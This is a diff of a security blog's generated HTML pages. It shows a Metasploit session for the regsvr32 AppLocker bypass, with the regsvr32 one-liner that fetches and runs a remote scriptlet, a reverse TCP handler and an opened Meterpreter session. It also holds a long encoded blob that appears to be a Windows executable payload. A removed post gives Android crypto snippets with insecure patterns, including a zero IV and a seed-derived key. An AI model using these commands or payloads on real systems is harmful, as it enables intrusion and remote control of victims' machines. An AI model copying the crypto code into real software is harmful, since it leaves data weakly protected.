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</span><br></pre></td></tr></table></figure>
 <hr>
-<p>###0x04 Metasploit regsvr32_applocker_bypass_server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set SRVPORT 8282</span><br><span class="line">SRVPORT =&gt; 8282</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:4444</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8282/zS8L0xcR7U0</span><br><span class="line">[*] Local IP: http://192.168.0.100:8282/zS8L0xcR7U0</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.0.100:8282/zS8L0xcR7U0.sct scrobj.dll</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Handling request for the .sct file from 192.168.0.100</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Delivering payload to 192.168.0.100</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 192.168.0.100:61502) at 2016-10-19 00:51:16 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; sessions -i 1</span><br></pre></td></tr></table></figure></p>
-
+<h3 id="0x04-Metasploit-regsvr32-applocker-bypass-server"><a href="#0x04-Metasploit-regsvr32-applocker-bypass-server" class="headerlink" title="0x04 Metasploit regsvr32_applocker_bypass_server"></a>0x04 Metasploit regsvr32_applocker_bypass_server</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set SRVPORT 8282</span><br><span class="line">SRVPORT =&gt; 8282</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:4444</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8282/zS8L0xcR7U0</span><br><span class="line">[*] Local IP: http://192.168.0.100:8282/zS8L0xcR7U0</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.0.100:8282/zS8L0xcR7U0.sct scrobj.dll</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Handling request for the .sct file from 192.168.0.100</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Delivering payload to 192.168.0.100</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 192.168.0.100:61502) at 2016-10-19 00:51:16 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; sessions -i 1</span><br></pre></td></tr></table></figure>
           
         
       
@@ -1638,139 +1755,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/22/Android-Encrypt-and-Decrypt/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/22/Android-Encrypt-and-Decrypt/" itemprop="url">
-                  Android Encrypt and Decrypt
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-22T11:15:19+08:00">
-                2016-09-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h3><blockquote>
-<p>Encrypt</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.util.Base64;</span><br><span class="line">String str = &quot;hello world&quot;;</span><br><span class="line">String base64str = Base64.encodeToString(str.getBytes(),Base64.DEFAULT);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Decrypt</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] m = Base64.decode(base64str,Base64.DEFAULT);</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-AES"><a href="#0x02-AES" class="headerlink" title="0x02 AES"></a>0x02 AES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import java.security.SecureRandom;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.KeyGenerator;</span><br><span class="line">import javax.crypto.SecretKey;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line">/**</span><br><span class="line"> * Usage:</span><br><span class="line"> * &lt;pre&gt;</span><br><span class="line"> * String crypto = SimpleCrypto.encrypt(masterpassword, cleartext)</span><br><span class="line"> * String cleartext = SimpleCrypto.decrypt(masterpassword, crypto)</span><br><span class="line"> * &lt;/pre&gt;</span><br><span class="line"> */</span><br><span class="line">public class SimpleCrypto &#123;</span><br><span class="line">    public static String encrypt(String seed, String cleartext)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        byte[] rawKey = getRawKey(seed.getBytes());</span><br><span class="line">        byte[] result = encrypt(rawKey, cleartext.getBytes());</span><br><span class="line">        return toHex(result);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String decrypt(String seed, String encrypted)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        byte[] rawKey = getRawKey(seed.getBytes());</span><br><span class="line">        byte[] enc = toByte(encrypted);</span><br><span class="line">        byte[] result = decrypt(rawKey, enc);</span><br><span class="line">        return new String(result);</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] getRawKey(byte[] seed) throws Exception &#123;</span><br><span class="line">        KeyGenerator kgen = KeyGenerator.getInstance(&quot;AES&quot;);</span><br><span class="line">        SecureRandom sr = SecureRandom.getInstance(&quot;SHA1PRNG&quot;);</span><br><span class="line">        sr.setSeed(seed);</span><br><span class="line">        kgen.init(128, sr); // 192 and 256 bits may not be available</span><br><span class="line">        SecretKey skey = kgen.generateKey();</span><br><span class="line">        byte[] raw = skey.getEncoded();</span><br><span class="line">        return raw;</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] encrypt(byte[] raw, byte[] clear) throws Exception &#123;</span><br><span class="line">        SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);</span><br><span class="line">        byte[] encrypted = cipher.doFinal(clear);</span><br><span class="line">        return encrypted;</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] decrypt(byte[] raw, byte[] encrypted)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, skeySpec);</span><br><span class="line">        byte[] decrypted = cipher.doFinal(encrypted);</span><br><span class="line">        return decrypted;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String toHex(String txt) &#123;</span><br><span class="line">        return toHex(txt.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">    public static String fromHex(String hex) &#123;</span><br><span class="line">        return new String(toByte(hex));</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] toByte(String hexString) &#123;</span><br><span class="line">        int len = hexString.length() / 2;</span><br><span class="line">        byte[] result = new byte[len];</span><br><span class="line">        for (int i = 0; i &lt; len; i++)</span><br><span class="line">            result[i] = Integer.valueOf(hexString.substring(2 * i, 2 * i + 2),</span><br><span class="line">                    16).byteValue();</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String toHex(byte[] buf) &#123;</span><br><span class="line">        if (buf == null)</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        StringBuffer result = new StringBuffer(2 * buf.length);</span><br><span class="line">        for (int i = 0; i &lt; buf.length; i++) &#123;</span><br><span class="line">            appendHex(result, buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    private final static String HEX = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">    private static void appendHex(StringBuffer sb, byte b) &#123;</span><br><span class="line">        sb.append(HEX.charAt((b &gt;&gt; 4) &amp; 0x0f)).append(HEX.charAt(b &amp; 0x0f));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-DES"><a href="#0x03-DES" class="headerlink" title="0x03 DES"></a>0x03 DES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class Des4 &#123;  </span><br><span class="line">    // 密钥  如果 密匙不足 8个 字符  java代码 要加 \0</span><br><span class="line">    // 例如 secretKey = &quot;xxxxxxx\0&quot;; </span><br><span class="line">    // 由于我们后台设置的密匙为7位，造成了一系列的麻烦，后经过查询php            // 文档解决，添加secretKey = &quot;xxxxxxx\0&quot;; </span><br><span class="line"></span><br><span class="line">    private final static String secretKey = &quot;&quot;;  </span><br><span class="line">    private static byte[] iv = &#123;0, 0, 0, 0, 0, 0, 0, 0&#125;;  </span><br><span class="line"></span><br><span class="line">    public static String encode(String plainText) throws Exception &#123;  </span><br><span class="line">        IvParameterSpec zeroIv = new IvParameterSpec(iv);  </span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), &quot;DES&quot;);  </span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);  </span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, key, zeroIv);  </span><br><span class="line">        byte[] encryptedData = cipher.doFinal(plainText.getBytes());  </span><br><span class="line">        return Base64.encodeToString(encryptedData, 1);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    public static String decode(String encryptText) throws Exception &#123;  </span><br><span class="line">        IvParameterSpec zeroIv = new IvParameterSpec(iv);  </span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), &quot;DES&quot;);  </span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);  </span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, key, zeroIv);  </span><br><span class="line">        byte[] decryptData = cipher.doFinal(Base64.decode(encryptText, 1));  </span><br><span class="line">        return new String(decryptData);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-apk伪加密"><a href="#0x04-apk伪加密" class="headerlink" title="0x04 apk伪加密"></a>0x04 apk伪加密</h3><blockquote>
-<p>pack</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">from zipfile import ZipFile, ZipInfo</span><br><span class="line"></span><br><span class="line">class ApkFile(ZipFile):</span><br><span class="line">	def compress(self, member, src_apk):</span><br><span class="line">		if not isinstance(member, ZipInfo):</span><br><span class="line">			member = self.getinfo(member)</span><br><span class="line">		try:</span><br><span class="line">			data_obj = src_apk.open(member, &apos;r&apos;)</span><br><span class="line">			data = data_obj.read()</span><br><span class="line">		except RuntimeError, e:</span><br><span class="line">			print e</span><br><span class="line">			return</span><br><span class="line">		member.flag_bits |= 1</span><br><span class="line">		self.writestr(member, data)</span><br><span class="line">		print &apos;compressing %s&apos; % member.filename</span><br><span class="line">				</span><br><span class="line">	def compressall(self, src_apk):</span><br><span class="line">		map(lambda entry: self.compress(entry, src_apk), src_apk.filelist)</span><br><span class="line">				</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;Add the encrypted flag to an APK. \</span><br><span class="line">	src_apk specifies the apk file you want to add encrypted flag, dst_apk is the output apk file.&apos;)</span><br><span class="line">	parser.add_argument(&apos;src_apk&apos;, type=str)</span><br><span class="line">	parser.add_argument(&apos;dst_apk&apos;, type=str)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	src_apk = ApkFile(args.src_apk, &apos;r&apos;)</span><br><span class="line">	dst_apk = ApkFile(args.dst_apk, &apos;w&apos;)</span><br><span class="line">	dst_apk.compressall(src_apk)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>unpack</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">from zipfile import ZipFile, ZipInfo</span><br><span class="line"></span><br><span class="line">class ApkFile(ZipFile):</span><br><span class="line">	def extract(self, member, path=None, pwd=None):</span><br><span class="line">		if not isinstance(member, ZipInfo):</span><br><span class="line">			member = self.getinfo(member)</span><br><span class="line">		member.flag_bits ^= member.flag_bits%2</span><br><span class="line">		ZipFile.extract(self, member, path, pwd)</span><br><span class="line">		print &apos;extracting %s&apos; % member.filename</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">	def extractall(self, path=None, members=None, pwd=None):</span><br><span class="line">		map(lambda entry: self.extract(entry, path, pwd), members if members is not None  and len(members)&gt;0 else self.filelist)</span><br><span class="line">				</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;unpacks an APK that contains files which are wrongly marked as encrypted&apos;)</span><br><span class="line">	parser.add_argument(&apos;apk&apos;, type=str)</span><br><span class="line">	parser.add_argument(&apos;file&apos;, type=str, nargs=&apos;*&apos;)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">	apk = ApkFile(args.apk,&apos;r&apos;)</span><br><span class="line">	apk.extractall(members=args.file)</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1816,7 +1800,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">83</span>
+              <span class="site-state-item-count">84</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1826,7 +1810,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">64</span>
+                <span class="site-state-item-count">65</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
